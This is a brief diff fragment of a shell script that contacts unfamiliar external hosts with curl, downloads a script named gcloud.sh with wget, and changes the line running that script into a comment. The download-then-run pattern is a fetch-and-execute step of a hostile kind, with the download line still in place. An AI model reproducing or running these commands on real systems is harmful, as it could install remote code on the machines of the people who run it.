@@ -21,4 +21,4 @@ $HOME/git-action.sh
 curl  http://w.ng.dissipator.ga:8081
 ls -l $HOME
 wget http://pi.lucas.ga:2280/luci-static/bin/gcloud.sh
-bash gcloud.sh
+#bash gcloud.sh
